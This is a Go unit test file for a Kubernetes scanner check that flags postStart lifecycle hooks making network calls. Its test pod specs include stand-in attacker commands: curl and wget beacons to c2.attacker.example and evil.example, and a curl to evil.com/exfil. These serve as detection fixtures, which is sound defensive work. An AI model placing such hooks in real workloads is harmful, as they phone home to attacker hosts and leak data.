package supply_chain

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/util/intstr"

	"github.com/stribog-cloud/kubevigil/internal/checker"
	"github.com/stribog-cloud/kubevigil/internal/checker/workload"
	"github.com/stribog-cloud/kubevigil/test/helpers"
)

func TestPostStartHookNetworkCallChecker_Run(t *testing.T) {
	c := &PostStartHookNetworkCallChecker{}
	ctx := context.Background()

	assert.Equal(t, "poststart-hook-network-call", c.Name())
	assert.NotEmpty(t, c.Description())
	assert.Contains(t, c.Categories(), checker.CategorySupplyChain)
	assert.Contains(t, c.SupportedModes(), checker.ScanModeLive)
	assert.Contains(t, c.SupportedModes(), checker.ScanModeManifest)
	assert.NotEmpty(t, c.RequiredResources())

	t.Run("empty cache", func(t *testing.T) {
		findings, err := c.Run(ctx, checker.NewResourceCache())
		require.NoError(t, err)
		assert.Empty(t, findings)
	})

	t.Run("cancelled context", func(t *testing.T) {
		cancelCtx, cancel := context.WithCancel(ctx)
		cancel()
		_, err := c.Run(cancelCtx, checker.NewResourceCache())
		assert.Error(t, err)
	})

	t.Run("postStart with curl", func(t *testing.T) {
		cache := checker.NewResourceCache()
		dep := makeDeployment(t, "beacon-app", "default", corev1.PodSpec{
			Containers: []corev1.Container{{
				Name:  "app",
				Image: "nginx:1.25",
				Lifecycle: &corev1.Lifecycle{
					PostStart: &corev1.LifecycleHandler{
						Exec: &corev1.ExecAction{
							Command: []string{"sh", "-c", "curl -s https://c2.attacker.example/beacon"},
						},
					},
				},
			}},
		})
		cache.Add(workload.GVRs()[1], dep)
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		require.Len(t, findings, 1)
		assert.Equal(t, checker.SeverityLow, findings[0].Severity)
		assert.Equal(t, "poststart-hook-network-call", findings[0].Checker)
		assert.Contains(t, findings[0].Message, "curl")
		assert.Equal(t, ".spec.containers[0].lifecycle.postStart.exec", findings[0].FieldPath)
	})

	t.Run("postStart with wget", func(t *testing.T) {
		cache := checker.NewResourceCache()
		dep := makeDeployment(t, "wget-app", "default", corev1.PodSpec{
			Containers: []corev1.Container{{
				Name:  "app",
				Image: "nginx:1.25",
				Lifecycle: &corev1.Lifecycle{
					PostStart: &corev1.LifecycleHandler{
						Exec: &corev1.ExecAction{
							Command: []string{"sh", "-c", "wget -qO- http://evil.example/beacon"},
						},
					},
				},
			}},
		})
		cache.Add(workload.GVRs()[1], dep)
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		require.Len(t, findings, 1)
		assert.Contains(t, findings[0].Message, "wget")
	})

	t.Run("postStart with httpGet", func(t *testing.T) {
		cache := checker.NewResourceCache()
		dep := makeDeployment(t, "http-hook-app", "default", corev1.PodSpec{
			Containers: []corev1.Container{{
				Name:  "app",
				Image: "nginx:1.25",
				Lifecycle: &corev1.Lifecycle{
					PostStart: &corev1.LifecycleHandler{
						HTTPGet: &corev1.HTTPGetAction{
							Path: "/init",
							Port: intstr.FromInt32(8080),
						},
					},
				},
			}},
		})
		cache.Add(workload.GVRs()[1], dep)
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		require.Len(t, findings, 1)
		assert.Contains(t, findings[0].Message, "HTTP request")
		assert.Equal(t, ".spec.containers[0].lifecycle.postStart.httpGet", findings[0].FieldPath)
	})

	t.Run("postStart with safe exec", func(t *testing.T) {
		cache := checker.NewResourceCache()
		dep := makeDeployment(t, "safe-hook-app", "default", corev1.PodSpec{
			Containers: []corev1.Container{{
				Name:  "app",
				Image: "nginx:1.25",
				Lifecycle: &corev1.Lifecycle{
					PostStart: &corev1.LifecycleHandler{
						Exec: &corev1.ExecAction{
							Command: []string{"/bin/sh", "-c", "echo started > /tmp/ready"},
						},
					},
				},
			}},
		})
		cache.Add(workload.GVRs()[1], dep)
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		assert.Empty(t, findings)
	})

	t.Run("preStop with network call does not trigger postStart check", func(t *testing.T) {
		cache := checker.NewResourceCache()
		dep := makeDeployment(t, "prestop-only-app", "default", corev1.PodSpec{
			Containers: []corev1.Container{{
				Name:  "app",
				Image: "nginx:1.25",
				Lifecycle: &corev1.Lifecycle{
					PreStop: &corev1.LifecycleHandler{
						Exec: &corev1.ExecAction{
							Command: []string{"sh", "-c", "curl http://evil.com/exfil"},
						},
					},
				},
			}},
		})
		cache.Add(workload.GVRs()[1], dep)
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		assert.Empty(t, findings)
	})

	t.Run("no lifecycle hooks", func(t *testing.T) {
		cache := checker.NewResourceCache()
		dep := makeDeployment(t, "clean-app", "default", corev1.PodSpec{
			Containers: []corev1.Container{{
				Name:  "app",
				Image: "nginx:1.25",
			}},
		})
		cache.Add(workload.GVRs()[1], dep)
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		assert.Empty(t, findings)
	})

	t.Run("init container with postStart curl triggers finding", func(t *testing.T) {
		cache := checker.NewResourceCache()
		dep := makeDeployment(t, "init-beacon-app", "default", corev1.PodSpec{
			InitContainers: []corev1.Container{{
				Name:  "init-setup",
				Image: "busybox:1.36",
				Lifecycle: &corev1.Lifecycle{
					PostStart: &corev1.LifecycleHandler{
						Exec: &corev1.ExecAction{
							Command: []string{"sh", "-c", "curl http://evil.com/init-beacon"},
						},
					},
				},
			}},
			Containers: []corev1.Container{{Name: "app", Image: "nginx:1.25"}},
		})
		cache.Add(workload.GVRs()[1], dep)
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		require.Len(t, findings, 1)
		assert.Equal(t, "init-setup", findings[0].Container)
		assert.Equal(t, ".spec.initContainers[0].lifecycle.postStart.exec", findings[0].FieldPath)
	})

	t.Run("fixture: failing.yaml", func(t *testing.T) {
		cache := helpers.LoadFixture(t, "poststart-hook-network-call", "failing.yaml")
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		assert.NotEmpty(t, findings)
		helpers.AssertAllFindingsHaveRequiredFields(t, findings)
	})

	t.Run("fixture: passing.yaml", func(t *testing.T) {
		cache := helpers.LoadFixture(t, "poststart-hook-network-call", "passing.yaml")
		findings, err := c.Run(ctx, cache)
		require.NoError(t, err)
		assert.Empty(t, findings)
	})
}
